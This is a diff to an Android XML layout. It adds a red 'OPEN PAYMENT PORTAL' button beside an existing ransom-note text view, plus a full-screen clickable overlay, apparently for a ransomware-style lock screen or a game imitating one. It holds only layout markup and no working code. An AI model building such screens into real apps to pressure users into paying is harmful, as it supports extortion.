@@ -103,6 +103,17 @@
             android:textColor="#ff8888"
             android:textSize="11sp"/>
 
+        <Button
+            android:id="@+id/paymentBtn"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:layout_gravity="center_horizontal"
+            android:layout_marginTop="12dp"
+            android:backgroundTint="#aa0000"
+            android:text="OPEN PAYMENT PORTAL"
+            android:textColor="#ffffff"
+            android:textStyle="bold"/>
+
         <TextView
             android:id="@+id/ransomNote"
             android:layout_width="match_parent"
@@ -118,6 +129,28 @@
             android:textSize="13sp"
             android:visibility="gone"/>
     </LinearLayout>
+
+    <FrameLayout
+        android:id="@+id/interludeOverlay"
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:background="#0A1F44"
+        android:clickable="true"
+        android:focusable="true"
+        android:visibility="gone">
+
+        <TextView
+            android:id="@+id/interludeText"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_gravity="center"
+            android:fontFamily="monospace"
+            android:gravity="center"
+            android:lineSpacingExtra="3dp"
+            android:text=""
+            android:textColor="#ffd700"
+            android:textSize="15sp"/>
+    </FrameLayout>
 
     <View
         android:id="@+id/borderFlash"
